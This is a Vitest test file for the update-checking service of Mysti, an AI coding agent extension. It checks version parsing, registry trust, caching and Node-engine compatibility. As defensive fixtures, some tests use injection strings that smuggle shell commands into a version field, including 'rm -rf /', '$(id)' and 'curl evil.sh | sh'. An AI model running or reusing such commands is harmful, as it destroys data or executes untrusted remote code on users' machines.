/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * Author: Baha Abunojaim <baha@deepmyst.com>
 * Website: https://www.deepmyst.com/mysti
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * CliUpdateService tests.
 *
 * Two things are load-bearing and are pinned hardest here:
 *  1. UNKNOWN IS NOT OUTDATED. An unparseable version on either side must
 *     produce no card. The failure mode otherwise is nagging every user whose
 *     CLI prints an unusual banner to run `npm install -g` forever.
 *  2. The npm registry response is UNTRUSTED. It is accepted only if it is
 *     exactly a semver, and it never reaches the update command — which is
 *     built from the in-repo package literal alone.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import type { ExtensionContext } from 'vscode';
import { createMockMemento } from '../helpers/mockVscode';

const execFileMock = vi.hoisted(() => vi.fn());
vi.mock('child_process', () => ({
  execFile: execFileMock,
  exec: vi.fn(),
  spawn: vi.fn(),
}));

import {
  CliUpdateService,
  parseVersion,
  compareVersions,
  type CliVersionSource,
} from '../../src/services/CliUpdateService';

function makeContext() {
  const globalState = createMockMemento();
  return { context: { globalState } as unknown as ExtensionContext, globalState };
}

type Status = { providerId: string; found: boolean; version?: string };

function makeVersions(statuses: Status[]): CliVersionSource {
  return {
    getAllStatuses: async () => statuses,
    peekStatus: (id: string) => statuses.find(s => s.providerId === id),
  };
}

/** Drive the mocked execFile callback with a stdout string (or an error). */
function stubNpm(byPackage: Record<string, string | Error>) {
  execFileMock.mockImplementation((_cmd: string, args: string[], _opts: unknown, cb: (error: Error | null, stdout?: string) => void) => {
    const pkg = args[1];
    const result = byPackage[pkg];
    if (result === undefined) {
      cb(new Error(`E404 ${pkg}`));
    } else if (result instanceof Error) {
      cb(result);
    } else {
      cb(null, result);
    }
    return { on: () => undefined };
  });
}

describe('parseVersion / compareVersions', () => {
  it('extracts a version out of decorated CLI output', () => {
    expect(parseVersion('1.0.5 (Claude Code)')).toMatchObject({ major: 1, minor: 0, patch: 5 });
    expect(parseVersion('v2.3.1')).toMatchObject({ major: 2, minor: 3, patch: 1 });
    expect(parseVersion('codex-cli 0.153.1')).toMatchObject({ major: 0, minor: 153, patch: 1 });
  });

  it('returns undefined rather than guessing when there is no version', () => {
    for (const bad of [undefined, '', 'unknown', 'beta', '1.2']) {
      expect(parseVersion(bad as string | undefined)).toBeUndefined();
    }
  });

  it('anchored mode rejects anything that is not exactly a version (registry output)', () => {
    expect(parseVersion('1.2.3', true)).toBeDefined();
    // A registry answer carrying anything else is refused outright.
    expect(parseVersion('1.2.3 && rm -rf /', true)).toBeUndefined();
    expect(parseVersion('latest', true)).toBeUndefined();
    expect(parseVersion('$(id)', true)).toBeUndefined();
  });

  it('orders by major, minor, then patch', () => {
    const v = (s: string) => parseVersion(s)!;
    expect(compareVersions(v('1.0.0'), v('2.0.0'))).toBeLessThan(0);
    expect(compareVersions(v('1.2.0'), v('1.10.0'))).toBeLessThan(0);
    expect(compareVersions(v('0.153.0'), v('0.153.1'))).toBeLessThan(0);
    expect(compareVersions(v('2.0.0'), v('2.0.0'))).toBe(0);
  });

  it('sorts a prerelease BELOW its own release', () => {
    const v = (s: string) => parseVersion(s)!;
    expect(compareVersions(v('1.2.3-beta'), v('1.2.3'))).toBeLessThan(0);
    expect(compareVersions(v('1.2.3'), v('1.2.3-beta'))).toBeGreaterThan(0);
  });
});

describe('CliUpdateService', () => {
  let ctx: ReturnType<typeof makeContext>;
  const npm = { getNpmPath: () => '/usr/bin/npm' };

  beforeEach(() => {
    ctx = makeContext();
    execFileMock.mockReset();
  });

  it('reports a backend whose installed CLI is behind npm', async () => {
    stubNpm({ '@continuedev/cli': '0.153.1' });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '0.140.0' }]),
      npm
    );

    const updates = await svc.checkAll();
    expect(updates).toHaveLength(1);
    expect(updates[0]).toMatchObject({
      providerId: 'continue',
      packageName: '@continuedev/cli',
      installed: '0.140.0',
      latest: '0.153.1',
    });
  });

  it('reports nothing when the installed CLI is current or ahead', async () => {
    stubNpm({ '@continuedev/cli': '0.153.1' });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '0.153.1' }]),
      npm
    );
    expect(await svc.checkAll()).toEqual([]);
  });

  it('never probes a provider that has no npm package', async () => {
    stubNpm({});
    const svc = new CliUpdateService(
      ctx.context,
      // cursor / ollama / hermes are shell-installer or local-server backends.
      makeVersions([
        { providerId: 'cursor', found: true, version: '1.0.0' },
        { providerId: 'ollama', found: true, version: '1.0.0' },
      ]),
      npm
    );
    expect(await svc.checkAll()).toEqual([]);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it('never probes a backend that is not installed', async () => {
    stubNpm({ '@continuedev/cli': '9.9.9' });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: false }]),
      npm
    );
    expect(await svc.checkAll()).toEqual([]);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  describe('unknown is not outdated', () => {
    it('stays quiet when the INSTALLED version is unparseable', async () => {
      stubNpm({ '@continuedev/cli': '0.153.1' });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: 'dev-build' }]),
        npm
      );
      expect(await svc.checkAll()).toEqual([]);
    });

    it('stays quiet when the REGISTRY answer is not exactly a version', async () => {
      stubNpm({ '@continuedev/cli': 'latest (0.153.1)' });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]),
        npm
      );
      expect(await svc.checkAll()).toEqual([]);
    });

    it('stays quiet (and does not throw) when npm fails — offline, private registry', async () => {
      stubNpm({ '@continuedev/cli': new Error('ENOTFOUND registry.npmjs.org') });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]),
        npm
      );
      await expect(svc.checkAll()).resolves.toEqual([]);
    });

    it('stays quiet when the version source itself throws', async () => {
      const svc = new CliUpdateService(
        ctx.context,
        { getAllStatuses: async () => { throw new Error('boom'); }, peekStatus: () => undefined },
        npm
      );
      await expect(svc.checkAll()).resolves.toEqual([]);
    });
  });

  describe('command construction (security)', () => {
    it('builds the command from the in-repo package literal only', () => {
      const svc = new CliUpdateService(ctx.context, makeVersions([]), npm);
      expect(svc.getUpdateCommand('continue')).toBe('npm install -g @continuedev/cli@latest');
      // Claude Code is detected via npm but must be updated with its OWN
      // installer: `npm i -g` writes /usr/local/bin while the native installer
      // writes ~/.local/bin, which is what PATH (and therefore Mysti) resolves.
      expect(svc.getUpdateCommand('claude-code')).toBe('claude install 2.1.266');
    });

    it('returns undefined for a non-npm or unknown provider, so no card can offer a command', () => {
      const svc = new CliUpdateService(ctx.context, makeVersions([]), npm);
      expect(svc.getUpdateCommand('cursor')).toBeUndefined();
      expect(svc.getUpdateCommand('ollama')).toBeUndefined();
      expect(svc.getUpdateCommand('not-a-provider')).toBeUndefined();
      expect(svc.getUpdateCommand('')).toBeUndefined();
    });

    it('a hostile registry response cannot reach the command line', async () => {
      // Even if the registry answered with an injection attempt, it is refused
      // by the anchored parse AND the command never interpolates it.
      stubNpm({ '@continuedev/cli': '9.9.9; curl evil.sh | sh' });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]),
        npm
      );
      expect(await svc.checkAll()).toEqual([]);
      expect(svc.getUpdateCommand('continue')).toBe('npm install -g @continuedev/cli@latest');
    });

    it('runs npm shell-free, as an argv array', async () => {
      stubNpm({ '@continuedev/cli': '1.0.0' });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]),
        npm
      );
      await svc.checkAll();

      const [cmd, args, opts] = execFileMock.mock.calls[0];
      expect(cmd).toBe('/usr/bin/npm');
      // `engines.node` rides along so the newest release can be checked against
      // the running Node in the SAME call — see the engine-gating tests below.
      expect(args).toEqual(['view', '@continuedev/cli', 'version', 'engines.node', '--json']);
      expect((opts as { shell?: boolean }).shell).toBeUndefined();
    });
  });

  describe('caching', () => {
    it('does not re-probe inside the TTL', async () => {
      stubNpm({ '@continuedev/cli': '1.0.0' });
      const versions = makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]);

      const svc = new CliUpdateService(ctx.context, versions, npm);
      await svc.checkAll();
      expect(execFileMock).toHaveBeenCalledTimes(1);

      await svc.checkAll();
      expect(execFileMock).toHaveBeenCalledTimes(1);
    });

    it('force re-probes regardless of TTL', async () => {
      stubNpm({ '@continuedev/cli': '1.0.0' });
      const svc = new CliUpdateService(
        ctx.context,
        makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]),
        npm
      );
      await svc.checkAll();
      await svc.checkAll({ force: true });
      expect(execFileMock).toHaveBeenCalledTimes(2);
    });

    it('reuses the persisted answer after a restart', async () => {
      stubNpm({ '@continuedev/cli': '1.0.0' });
      const versions = makeVersions([{ providerId: 'continue', found: true, version: '0.1.0' }]);
      await new CliUpdateService(ctx.context, versions, npm).checkAll();
      execFileMock.mockClear();

      const revived = new CliUpdateService(ctx.context, versions, npm);
      // Synchronous read, no probe.
      expect(revived.getUpdates().map(u => u.latest)).toEqual(['1.0.0']);
      expect(execFileMock).not.toHaveBeenCalled();
    });
  });

  it('fires onDidFindUpdates only when something is actually outdated', async () => {
    stubNpm({ '@continuedev/cli': '1.0.0' });
    const fresh = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '1.0.0' }]),
      npm
    );
    const spy = vi.fn();
    fresh.onDidFindUpdates(spy);
    await fresh.checkAll();
    expect(spy).not.toHaveBeenCalled();

    const stale = new CliUpdateService(
      makeContext().context,
      makeVersions([{ providerId: 'continue', found: true, version: '0.9.0' }]),
      npm
    );
    const spy2 = vi.fn();
    stale.onDidFindUpdates(spy2);
    await stale.checkAll();
    expect(spy2).toHaveBeenCalledTimes(1);
  });
});

// ---------------------------------------------------------------------------
// Node-engine gating (2026-09-06)
//
// "Latest published" and "latest installable" are not the same version, and
// offering the former is offering a command that fails. openclaw 2026.9.2
// requires Node >=22.22.3; on a Node 22.20.0 machine `npm i -g openclaw@latest`
// aborts in a preinstall hook — and, batched with other packages in one
// `npm i -g`, took every one of them down with it and installed nothing.
// ---------------------------------------------------------------------------
import { satisfiesNodeRange, parseNpmViewEntries } from '../../src/services/CliUpdateService';
import { VERIFIED_NATIVE_CLI_VERSIONS } from '../../src/providers/base/NativeCliVersions';

describe('verified native execution update targets', () => {
  const npm = { getNpmPath: () => '/usr/bin/npm' };
  const providers = [
    ['claude-code', '@anthropic-ai/claude-code', '2.1.278'],
    ['openai-codex', '@openai/codex', '0.155.1'],
    ['google-gemini', '@google/gemini-cli', '0.61.0'],
    ['github-copilot', '@github/copilot', '1.0.86'],
    ['opencode', 'opencode-ai', '1.18.31'],
    ['cline', 'cline', '99.0.0'],
    ['qwen-code', '@qwen-code/qwen-code', '99.0.0'],
    ['openclaw', 'openclaw', '2026.9.2'],
  ] as const;

  beforeEach(() => { execFileMock.mockReset(); });

  it('does not replace a supported OpenClaw runtime with a newer Node-compatible but unattested release', async () => {
    stubNpm({
      openclaw: JSON.stringify({ version: '2026.9.2', 'engines.node': '>=18' }),
      'openclaw@2026.6.34': JSON.stringify({ version: '2026.6.34', 'engines.node': '>=18' }),
    });
    const svc = new CliUpdateService(makeContext().context,
      makeVersions([{ providerId: 'openclaw', found: true, version: '2026.6.34' }]), npm);
    expect(await svc.checkAll()).toEqual([]);
    expect(svc.getUpdateCommand('openclaw')).toBeUndefined();
  });

  it.each(providers)('%s recommends only its verified target and checks that target’s engine', async (providerId, pkg, latest) => {
    const verified = VERIFIED_NATIVE_CLI_VERSIONS[providerId];
    stubNpm({ [pkg]: latest, [`${pkg}@${verified}`]: JSON.stringify({ version: verified, 'engines.node': '>=18' }) });
    const context = makeContext();
    const versions = makeVersions([{ providerId, found: true, version: '0.0.1' }]);
    const svc = new CliUpdateService(context.context, versions, npm);
    expect(await svc.checkAll()).toEqual([expect.objectContaining({
      latest, installable: verified, blockedByNativeBridge: true, blockedByNodeEngine: false,
    })]);
    const expected = providerId === 'claude-code' ? `claude install ${verified}` : `npm install -g ${pkg}@${verified}`;
    expect(svc.getUpdateCommand(providerId)).toBe(expected);
    expect(execFileMock.mock.calls.map(call => call[1][1])).toEqual([pkg, `${pkg}@${verified}`]);
    expect(new CliUpdateService(context.context, versions, npm).getUpdateCommand(providerId)).toBe(expected);
  });

  it.each(providers)('%s does not update a verified install to an unsupported release or downgrade a newer install', async (providerId, pkg, latest) => {
    const verified = VERIFIED_NATIVE_CLI_VERSIONS[providerId];
    stubNpm({ [pkg]: latest, [`${pkg}@${verified}`]: verified });
    for (const version of [verified, latest]) {
      const svc = new CliUpdateService(makeContext().context, makeVersions([{ providerId, found: true, version }]), npm);
      expect(await svc.checkAll()).toEqual([]);
      expect(svc.getUpdateCommand(providerId)).toBeUndefined();
    }
  });

  it.each(['unavailable', 'incompatible', 'wrong-version'])('does not substitute an unverified runtime when the supported package is %s', async failure => {
    const verified = VERIFIED_NATIVE_CLI_VERSIONS['google-gemini'];
    const pkg = '@google/gemini-cli';
    stubNpm({ [pkg]: '0.61.0', [`${pkg}@${verified}`]: failure === 'unavailable' ? new Error('E404')
      : JSON.stringify({ version: failure === 'wrong-version' ? '0.59.0' : verified, 'engines.node': `>=${bump(process.versions.node)}` }) });
    const svc = new CliUpdateService(makeContext().context, makeVersions([{ providerId: 'google-gemini', found: true, version: '0.1.0' }]), npm);
    expect(await svc.checkAll()).toEqual([]);
    expect(svc.getUpdateCommand('google-gemini')).toBeUndefined();
  });

  it.each([
    ['openai-codex', '@openai/codex', '0.155.1', '0.153.4'],
    ['openclaw', 'openclaw', '2026.9.2', '2026.6.34'],
  ])('revalidates a %s pre-contract cache before offering an update', async (providerId, pkg, latest, verified) => {
    const ctx = makeContext();
    await ctx.globalState.update('mysti.cliUpdates.v1', { [providerId]: { latest, checkedAt: Date.now() } });
    const versions = makeVersions([{ providerId, found: true, version: '0.1.0' }]);
    const svc = new CliUpdateService(ctx.context, versions, npm);
    expect(svc.getUpdates()).toEqual([]);
    expect(svc.getUpdateCommand(providerId)).toBeUndefined();
    stubNpm({ [pkg]: latest, [`${pkg}@${verified}`]: verified });
    expect(await svc.checkAll()).toHaveLength(1);
    expect(svc.getUpdateCommand(providerId)).toBe(`npm install -g ${pkg}@${verified}`);
  });

  it('uses one metadata request when upstream and verified versions agree', async () => {
    stubNpm({ '@openai/codex': '0.153.4' });
    const svc = new CliUpdateService(makeContext().context, makeVersions([{ providerId: 'openai-codex', found: true, version: '0.1.0' }]), npm);
    expect(await svc.checkAll()).toEqual([expect.objectContaining({ latest: '0.153.4', installable: '0.153.4', blockedByNativeBridge: false })]);
    expect(execFileMock).toHaveBeenCalledOnce();
  });
});

describe('satisfiesNodeRange', () => {
  it('handles the ranges package authors actually write', () => {
    // The real openclaw range, against the real Node that failed on it.
    const openclaw = '>=22.22.3 <23 || >=24.15.0 <25 || >=25.9.0';
    expect(satisfiesNodeRange('22.20.0', openclaw)).toBe(false);
    expect(satisfiesNodeRange('22.22.3', openclaw)).toBe(true);
    expect(satisfiesNodeRange('22.23.2', openclaw)).toBe(true);
    expect(satisfiesNodeRange('23.0.0', openclaw)).toBe(false);
    expect(satisfiesNodeRange('24.15.0', openclaw)).toBe(true);
    expect(satisfiesNodeRange('26.0.0', openclaw)).toBe(true);
  });

  it('handles a bare lower bound and partial versions', () => {
    expect(satisfiesNodeRange('22.20.0', '>=22.19.0')).toBe(true);
    expect(satisfiesNodeRange('22.20.0', '>=24')).toBe(false);
    expect(satisfiesNodeRange('22.20.0', '>=20 <23')).toBe(true);
    expect(satisfiesNodeRange('v22.20.0', '>=22.19.0')).toBe(true);
  });

  it('treats an absent or wildcard range as satisfied', () => {
    expect(satisfiesNodeRange('22.20.0', undefined)).toBe(true);
    expect(satisfiesNodeRange('22.20.0', '')).toBe(true);
    expect(satisfiesNodeRange('22.20.0', '*')).toBe(true);
  });

  /**
   * This function only ever DOWNGRADES what Mysti offers, so "I could not read
   * that" has to mean "offer the latest and let npm speak". Failing closed would
   * silently hide good updates behind a range syntax nobody anticipated.
   */
  it('fails OPEN on a range it cannot parse', () => {
    expect(satisfiesNodeRange('22.20.0', '^22 || lts/*')).toBe(true);
    expect(satisfiesNodeRange('22.20.0', 'weird nonsense')).toBe(true);
  });
});

describe('parseNpmViewEntries', () => {
  it('reads every shape npm actually emits', () => {
    // One match, two fields.
    expect(parseNpmViewEntries('{"version":"1.2.3","engines.node":">=20"}'))
      .toEqual([{ version: '1.2.3', engines: '>=20' }]);
    // Many matches.
    expect(parseNpmViewEntries('[{"version":"1.0.0"},{"version":"1.1.0","engines.node":">=22"}]'))
      .toEqual([{ version: '1.0.0', engines: undefined }, { version: '1.1.0', engines: '>=22' }]);
    // One match, one field: a bare JSON string.
    expect(parseNpmViewEntries('"1.2.3"')).toEqual([{ version: '1.2.3' }]);
    // An older npm prints it unquoted.
    expect(parseNpmViewEntries('1.2.3\n')).toEqual([{ version: '1.2.3' }]);
  });

  it('drops rows without a usable version rather than trusting them', () => {
    expect(parseNpmViewEntries('[{"engines.node":">=20"},{"version":42},{"version":"2.0.0"}]'))
      .toEqual([{ version: '2.0.0', engines: undefined }]);
    expect(parseNpmViewEntries('')).toEqual([]);
    expect(parseNpmViewEntries('not json at all')).toEqual([{ version: 'not json at all' }]);
  });
});

describe('offering an update that can actually be installed', () => {
  let ctx: ReturnType<typeof makeContext>;
  const npm = { getNpmPath: () => '/usr/bin/npm' };

  beforeEach(() => {
    execFileMock.mockReset();
    ctx = makeContext();
  });

  /**
   * Answer npm per SPEC, so the range query used to find an older compatible
   * release is distinguishable from the plain latest lookup.
   */
  function stubRegistry(bySpec: Record<string, string>) {
    execFileMock.mockImplementation((_cmd: string, args: string[], _opts: unknown, cb: (error: Error | null, stdout?: string) => void) => {
      const spec = args[1];
      const result = bySpec[spec];
      if (result === undefined) { cb(new Error(`E404 ${spec}`)); } else { cb(null, result); }
      return { on: () => undefined };
    });
  }

  /** Preserve Node-engine fallback coverage on an unpinned provider. */
  it('offers the newest release this Node can install, not the newest published', async () => {
    stubRegistry({
      '@continuedev/cli': JSON.stringify({
        version: '1.9.2',
        'engines.node': `>=${bump(process.versions.node)} <99`,
      }),
      '@continuedev/cli@<1.9.2': JSON.stringify([
        { version: '1.6.30', 'engines.node': '>=18.0.0' },
        { version: '1.6.34', 'engines.node': '>=18.0.0' },
        { version: '1.8.1', 'engines.node': `>=${bump(process.versions.node)} <99` },
      ]),
    });

    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '1.2.13' }]),
      npm
    );
    await svc.checkAll();

    const [update] = svc.getUpdates();
    expect(update.latest).toBe('1.9.2');
    expect(update.installable).toBe('1.6.34');
    expect(update.blockedByNodeEngine).toBe(true);
    expect(update.requiredNode).toContain('>=');

    // …and the command pins that version rather than saying @latest, which is
    // the command that aborts in a preinstall hook.
    expect(svc.getUpdateCommand('continue')).toBe('npm install -g @continuedev/cli@1.6.34');
  });

  it('uses @latest when the newest release runs on this Node', async () => {
    stubRegistry({
      '@continuedev/cli': JSON.stringify({ version: '1.9.2', 'engines.node': '>=18.0.0' }),
    });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '1.2.13' }]),
      npm
    );
    await svc.checkAll();

    const [update] = svc.getUpdates();
    expect(update.installable).toBe('1.9.2');
    expect(update.blockedByNodeEngine).toBe(false);
    expect(svc.getUpdateCommand('continue')).toBe('npm install -g @continuedev/cli@latest');
    // Only one registry call: the fallback search is not made when it is moot.
    expect(execFileMock).toHaveBeenCalledTimes(1);
  });

  /**
   * When even the newest compatible release is not ahead of what is installed,
   * there is nothing to offer — and nagging with an uninstallable version would
   * be worse than silence.
   */
  it('says nothing when no installable release is newer than what is installed', async () => {
    stubRegistry({
      '@continuedev/cli': JSON.stringify({
        version: '1.9.2',
        'engines.node': `>=${bump(process.versions.node)} <99`,
      }),
      '@continuedev/cli@<1.9.2': JSON.stringify([
        { version: '1.6.30', 'engines.node': `>=${bump(process.versions.node)} <99` },
      ]),
    });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '1.6.34' }]),
      npm
    );
    await svc.checkAll();
    expect(svc.getUpdates()).toEqual([]);
  });

  it('never steers onto a prerelease', async () => {
    stubRegistry({
      '@continuedev/cli': JSON.stringify({
        version: '1.9.2',
        'engines.node': `>=${bump(process.versions.node)} <99`,
      }),
      '@continuedev/cli@<1.9.2': JSON.stringify([
        { version: '1.6.34', 'engines.node': '>=18.0.0' },
        { version: '1.7.1-beta.6', 'engines.node': '>=18.0.0' },
      ]),
    });
    const svc = new CliUpdateService(
      ctx.context,
      makeVersions([{ providerId: 'continue', found: true, version: '1.2.13' }]),
      npm
    );
    await svc.checkAll();
    expect(svc.getUpdates()[0].installable).toBe('1.6.34');
  });
});

/** A Node version one minor above the running one — guaranteed incompatible. */
function bump(nodeVersion: string): string {
  const [major, minor] = nodeVersion.replace(/^v/, '').split('.').map(Number);
  return `${major}.${minor + 1}.0`;
}
